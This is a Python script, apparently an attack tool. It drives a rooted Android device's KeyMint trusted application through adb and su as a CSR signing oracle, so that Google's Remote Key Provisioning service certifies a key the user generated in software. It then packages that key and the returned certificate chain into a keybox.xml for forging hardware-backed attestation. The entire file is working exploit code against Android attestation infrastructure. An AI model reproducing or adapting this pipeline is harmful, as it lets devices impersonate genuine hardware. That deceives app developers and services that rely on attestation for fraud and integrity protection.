#!/usr/bin/env python3
"""
RKP oracle pipeline: use the device's KeyMint TA (via kmcli, cmd 0x3122) as a
CSR signing oracle to provision OUR software-generated P-256 key with Google.

Flow:
  1. fetchEekChain (Google) -> challenge
  2. build TA request {4: challenge, 57: bstr(COSE_Key of our key)}
  3. kmcli 3122 on device -> AuthenticatedRequest CSR (real DICE chain+CDI_Leaf sig)
  4. submit_csr -> Google signCertificates -> cert chain
  5. build_keybox_xml(our privkey, chain) -> keybox.xml
"""
import os
import subprocess
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "google-rkp-sw"))
import cbor2
from rkp_sw import (fetch_eek, submit_csr, generate_ec_keypair,
                    parse_der_cert_chain, build_keybox_xml,
                    get_fingerprint)

ENV = dict(os.environ)
ENV["MSYS_NO_PATHCONV"] = "1"
os.environ.setdefault("HTTPS_PROXY", "http://127.0.0.1:7897")
os.environ.setdefault("HTTP_PROXY", "http://127.0.0.1:7897")
FINGERPRINT = os.environ.get("RKP_FP") or get_fingerprint("google-rkp-sw/device_prop.conf")
OUTDIR = sys.argv[1] if len(sys.argv) > 1 else "."
os.makedirs(OUTDIR, exist_ok=True)
OUT_CSR = os.path.join(OUTDIR, "oracle_csr.cbor")
OUT_KEYBOX = os.path.join(OUTDIR, "keybox.xml")
OUT_PRIVKEY = os.path.join(OUTDIR, "attest_key_priv.pem")


def adb(cmd):
    r = subprocess.run(["adb", "shell", cmd], capture_output=True, text=True, env=ENV)
    return r.stdout


def main():
    print("[1] generate our P-256 keypair")
    ec_priv, ec_cose_pub = generate_ec_keypair()
    x = ec_cose_pub[-2]
    print("    pub x:", x.hex()[:32], "...")

    print("[2] fetchEekChain")
    challenge, eek_pub, eek_curve, _ = fetch_eek(FINGERPRINT)
    assert len(challenge) <= 64

    print("[3] build TA CSR_V2 request")
    req = cbor2.dumps({4: challenge, 57: cbor2.dumps([ec_cose_pub])})
    print(f"    request {len(req)} bytes")

    print("[4] kmcli 0x3122 on device")
    out = adb("su -c 'KMCLI_OUT=/data/local/tmp/csr_oracle.bin "
              f"/data/local/tmp/kmcli 3122 {req.hex()}; chmod 644 /data/local/tmp/csr_oracle.bin'")
    print("   ", [l for l in out.splitlines() if "retcode" in l or "payload ->" in l])
    if "retcode = 0x00000000" not in out:
        print("[-] TA rejected request")
        print(out[-2000:])
        return 1
    subprocess.run(["adb", "pull", "/data/local/tmp/csr_oracle.bin", OUT_CSR],
                   capture_output=True, env=ENV)
    csr = open(OUT_CSR, "rb").read()
    print(f"    CSR {len(csr)} bytes -> {OUT_CSR}")
    top = cbor2.loads(csr)
    if isinstance(top, dict):
        # TA wraps the AuthenticatedRequest in {61: bstr}
        csr = bytes(top[61])
        print(f"    unwrapped AuthenticatedRequest: {len(csr)} bytes")

    print("[5] submit to Google signCertificates")
    try:
        chains = submit_csr(csr, challenge)
    except Exception as e:
        print(f"[-] submit failed: {e}")
        return 1
    if not chains:
        print("[-] no chains returned")
        return 1

    certs = parse_der_cert_chain(chains[0])
    print(f"    chain: {len(certs)} certs")
    for c in certs:
        print("     -", c.subject.rfc4514_string()[:70], "| issuer:", c.issuer.rfc4514_string()[:50])

    print("[6] build keybox.xml")
    xml = build_keybox_xml(ec_privkey=ec_priv, ec_cert_chain=certs,
                           device_id=os.environ.get("RKP_DEVICE_ID", "generic"))
    open(OUT_KEYBOX, "w").write(xml)
    from cryptography.hazmat.primitives.serialization import Encoding, PrivateFormat, NoEncryption
    open(OUT_PRIVKEY, "wb").write(ec_priv.private_bytes(
        Encoding.PEM, PrivateFormat.TraditionalOpenSSL, NoEncryption()))
    print(f"[+] {OUT_KEYBOX} written (+ {OUT_PRIVKEY})")
    return 0


if __name__ == "__main__":
    sys.exit(main())
